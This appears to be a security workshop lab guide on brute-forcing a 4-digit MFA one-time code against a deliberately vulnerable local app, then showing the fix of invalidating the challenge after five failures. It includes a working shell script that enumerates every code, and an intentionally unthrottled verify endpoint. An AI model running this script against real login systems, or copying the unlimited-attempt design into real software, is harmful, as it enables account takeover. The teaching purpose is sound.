# Lab 11 – Brute Force MFA Protection

## Learning objectives

- Understand why short OTPs without rate limiting are trivially enumerable
- See how a 4-digit code (10,000 possibilities) can be brute-forced in seconds
- Learn the mitigation: invalidate the challenge after N failed attempts

## Background

Multi-factor authentication adds a second proof of identity beyond a password.
A common implementation generates a short numeric code (OTP) that is delivered
out-of-band (SMS, email, authenticator app) and must be submitted within a short window.

The weakness: if the verification endpoint does not limit failed attempts, an attacker
who can trigger a challenge (e.g., by compromising the password) can simply enumerate
all possible codes. For a 4-digit OTP, that is only 10,000 requests.

In **Vulnerable** mode: no attempt counting. All 10,000 codes can be tried; the correct
one always succeeds.

In **Fixed** mode: after 5 wrong guesses the challenge is invalidated and the endpoint
returns `429 Too Many Requests`. A new challenge must be requested, starting the clock
and (in a real system) triggering a new out-of-band delivery.

---

## Workshop settings

In `appsettings.json`:

```json
"MfaBruteForceProtection": "Vulnerable"
```

Change to `"Fixed"` to demonstrate the protection.

---

## Endpoints

| Method | Path | Purpose |
|---|---|---|
| `POST` | `/api/auth/mfa/challenge` | Generate a fresh 4-digit OTP (replaces any existing one) |
| `GET`  | `/api/auth/mfa/otp`       | **Workshop only** — returns the current code (simulates SMS/email) |
| `POST` | `/api/auth/mfa/verify`    | Submit a code — vulnerable to brute force without rate limiting |

All three require a valid JWT (`Authorization: Bearer <token>`).

---

## Step 1 – Authenticate and request a challenge

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Partner1234!"}' | jq -r '.token')

curl -s -X POST http://localhost:5000/api/auth/mfa/challenge \
  -H "Authorization: Bearer $TOKEN" | jq
```

Response:
```json
{ "expiresAt": "2026-05-04T12:10:00Z", "ttlMinutes": 10 }
```

---

## Step 2 – Retrieve the OTP (workshop delivery simulation)

```bash
curl -s http://localhost:5000/api/auth/mfa/otp \
  -H "Authorization: Bearer $TOKEN" | jq
```

Response (Vulnerable mode):
```json
{
  "code": "3742",
  "expiresAt": "2026-05-04T12:10:00Z",
  "attemptsRemaining": null,
  "workshopNote": "This endpoint exists only for the workshop — it simulates SMS/email delivery."
}
```

Response (Fixed mode):
```json
{
  "code": "3742",
  "expiresAt": "2026-05-04T12:10:00Z",
  "attemptsRemaining": 5,
  ...
}
```

---

## Step 3 – Brute-force attack (Vulnerable mode)

The following script enumerates every possible 4-digit code until the server returns `200 OK`.

```sh
#!/bin/sh
# brute_force_otp.sh — BookingDojo Lab 11
TOKEN="$1"
API="http://localhost:5000"

if [ -z "$TOKEN" ]; then
  echo "Usage: $0 <bearer-token>"
  exit 1
fi

# Request a fresh challenge
curl -s -X POST "$API/api/auth/mfa/challenge" \
  -H "Authorization: Bearer $TOKEN" > /dev/null

echo "Brute-forcing OTP (0000–9999)…"
i=0
while [ "$i" -le 9999 ]; do
  CODE=$(printf '%04d' "$i")
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
    -X POST "$API/api/auth/mfa/verify" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$CODE\"}")
  if [ "$STATUS" = "200" ]; then
    echo "Found OTP: $CODE (after $i attempts)"
    exit 0
  fi
  i=$(( i + 1 ))
done

echo "Not found — challenge may have expired."
```

Run it:

```bash
chmod +x brute_force_otp.sh
./brute_force_otp.sh "$TOKEN"
# Found OTP: 3742 (after 3742 attempts)
```

On average 5,000 requests are needed; at 200 req/s that is ~25 seconds.

---

## Step 4 – Observe the Fixed mode

Set `MfaBruteForceProtection` to `"Fixed"` and repeat:

```bash
# Request a new challenge first
curl -s -X POST http://localhost:5000/api/auth/mfa/challenge \
  -H "Authorization: Bearer $TOKEN" > /dev/null

# Send 5 wrong codes
for code in 0000 0001 0002 0003 0004; do
  curl -s -X POST http://localhost:5000/api/auth/mfa/verify \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$code\"}" | jq .
done
```

After 5 failures you receive:
```json
{ "message": "Too many failed attempts. Challenge invalidated — request a new one." }
```
HTTP status `429`. The challenge is deleted from the database. The attacker must call
`POST /challenge` again, starting over — and in a real system that triggers a new
SMS/email to the legitimate user, who would notice the repeated messages.

---

## Key takeaways

| | Vulnerable | Fixed |
|---|---|---|
| Attempts before lockout | Unlimited | 5 |
| Time to brute-force (200 req/s) | ~25 seconds | Impossible |
| Status on lockout | 401 forever | 429, challenge deleted |
| Recovery | N/A | Request a new challenge |

**Additional mitigations used in production:**
- Longer codes (6–8 digits, or alphanumeric)
- Per-user IP-based rate limiting on the challenge endpoint
- Exponential back-off between attempts
- Challenge bound to the device/session that requested it
- Short TTL (60–120 seconds instead of 10 minutes)
